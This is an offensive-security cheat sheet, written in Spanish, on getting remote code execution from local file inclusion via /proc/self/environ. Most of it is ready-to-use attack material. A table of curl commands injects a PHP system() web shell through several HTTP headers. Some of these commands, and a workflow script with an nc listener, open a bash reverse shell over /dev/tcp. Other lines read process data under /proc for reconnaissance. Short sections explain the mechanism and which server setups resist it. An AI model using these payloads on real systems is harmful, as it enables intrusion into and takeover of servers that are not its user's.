---
aliases:
tags:
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[File Inclusion]]"
---
# LFI To RCE - /proc/self/environ

***

## Cheatsheet

| **Payload / Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -A '<?php system($_GET["cmd"]); ?>' 'https://target/?page=/proc/self/environ&cmd=id'` | User-Agent inyectado en environ → ejecuta al incluir | Webserver con `/proc/self/environ` legible. CGI mode. |
| `curl -e '<?php system($_GET["cmd"]); ?>' 'https://target/?page=/proc/self/environ&cmd=id'` | Referer header en environ | UA filtrado por WAF/app. |
| `curl -H 'Accept-Language: <?php system($_GET["cmd"]); ?>' 'https://target/?page=/proc/self/environ&cmd=id'` | Accept-Language en environ | Headers menos monitoreados. |
| `curl -H 'X-Forwarded-For: <?php system($_GET["cmd"]); ?>' 'https://target/?page=/proc/self/environ&cmd=id'` | XFF en environ | Custom header — pasa la mayoría de WAFs. |
| `curl -b 'tracking=<?php system($_GET["cmd"]); ?>' 'https://target/?page=/proc/self/environ&cmd=id'` | Cookie en environ (si CGI la propaga como `HTTP_COOKIE`) | CGI environment exposing cookies. |
| `curl -A '<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\""); ?>' 'https://target/?page=/proc/self/environ'` | Reverse shell PHP inyectado via UA | Reverse shell. |
| `?page=/proc/self/fd/0` o `/proc/self/fd/2` | stdin/stderr del web process | Alt cuando `/proc/self/environ` bloqueado. |
| `?page=/proc/$PID/environ` (iterar) | Environ de otros procesos | Cuando el LFI permite `/proc/N/`. |
| `?page=/proc/self/cmdline` | Cmdline del binario actual | Recon previo — confirma proceso/path. |
| `?page=/proc/self/maps` | Memory maps del proceso | Recon de libs cargadas. |
^lfi-environ

### Workflow

```bash
TARGET="https://target/?page="

# 1. Confirmar /proc/self/environ legible
curl -s "${TARGET}/proc/self/environ"
# Debería responder con vars de entorno (HTTP_USER_AGENT=..., HTTP_HOST=..., etc.)

# 2. Inyectar PHP en UA
curl -s -A '<?php system($_GET["cmd"]); ?>' "${TARGET}/proc/self/environ&cmd=id"

# 3. Si environ bloqueado, probar file descriptors
for fd in 0 1 2 3 4 5 6 7; do
  echo "=== /proc/self/fd/$fd ==="
  curl -s "${TARGET}/proc/self/fd/$fd" | head -3
done

# 4. Reverse shell directa
LHOST="10.10.10.10"
LPORT="4444"
nc -lvnp $LPORT &

curl -s -A "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\"); ?>" \
  "${TARGET}/proc/self/environ"
```

### Cuándo NO funciona

- **Apache mod_php moderno** — `/proc/self/environ` típicamente NO contiene HTTP headers (solo env vars del worker).
- **`/proc` con permisos restrictivos** — webserver no lee `/proc/self/environ` propio.
- **PHP-FPM** — environ es del proceso master, no por-request.
- **Sandboxing** — Docker/AppArmor/seccomp bloquea `/proc/*/environ` accesos.

### Cuándo SÍ funciona

- **CGI mode** clásico (mod_cgi en Apache).
- **PHP CGI vía `php-cgi`** binario.
- Some legacy shared hosting.
- Custom backends que ponen headers HTTP en env vars del child process.

___

## Overview

En setups CGI clásicos, el webserver pasa headers HTTP como env vars (`HTTP_USER_AGENT`, `HTTP_REFERER`, etc.) al proceso child que sirve el request. Esas vars quedan en `/proc/self/environ` mientras el proceso vive.

**Mecanismo:**
1. Atacante envía request con PHP en User-Agent.
2. Server lanza child process con env `HTTP_USER_AGENT=<?php system... ?>`.
3. Child process abre LFI → `include('/proc/self/environ')`.
4. PHP encuentra `<?php ... ?>` en el contenido del environ → ejecuta.

**Limitación crítica**: en stacks modernos (mod_php, FPM, sandboxed) este vector NO funciona porque los headers no van al environ. Es un vector legacy pero efectivo cuando aplica.

Similar conceptualmente a [[LFI To RCE - Log Poisoning]] pero más directo — no requiere conocer paths de logs ni permisos especiales sobre `/var/log/`.

***
